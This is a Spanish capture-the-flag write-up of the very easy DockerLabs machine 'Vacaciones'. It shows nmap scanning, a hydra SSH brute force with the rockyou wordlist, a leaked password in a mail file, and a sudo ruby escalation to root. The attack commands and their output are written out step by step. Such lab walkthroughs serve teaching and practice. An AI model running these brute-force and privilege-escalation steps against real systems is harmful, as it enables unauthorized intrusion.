# Máquina Vacaciones

Dificultad -> Muy fácil

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

Creador -> @romabri -> [romabri](https://github.com/romabri)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p 172.17.0.2 -oN targeted
________________________________________________
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4116eb546434d169eedcd9219c72a5c1 (RSA)
|   256 f0c42b02503a49a7a234b80961fd2c6d (ECDSA)
|_  256 dfe946319aef0d81311f77e429f5c988 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesnt have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Al inspeccionar la web encontramos ese comentario en el código fuente:

![Pasted image 20240425184410](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/1525b762-1c0b-4d91-a142-fc3fed1ae569)

--------------
## Explotación

Utilizamos hydra con los usuarios **camilo** y **juan** al **ssh**:

```shell
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
------------------------------------------------------------------
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
```

Encontramos las credenciales de camilo -> **camilo:password1**

Nos conectamos como el usuario camilo y estamos dentro !

------------
## Escalada de privilegios

Revisamos el supuesto correo que nos indicaba en la web:

```shell
cd /var/mail
cd camilo
cat correo.txt
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

Probamos la contraseña con el usuario **juan** y funciona. -> **juan:2k84dicb**
Hemos migrado al usuario **juan**.

Hacemos un **sudo -l**

```shell
sudo -l
---------------------------------
User juan may run the following commands on b078e5dff54b:
    (ALL) NOPASSWD: /usr/bin/ruby
```

Podemos ejecutar **ruby** como el usuario **root**, si no sabemos como abusar de esto, siempre podemos recurrir a [GTFOBins]()

```shell
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
```

```shell
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximo en la máquina.

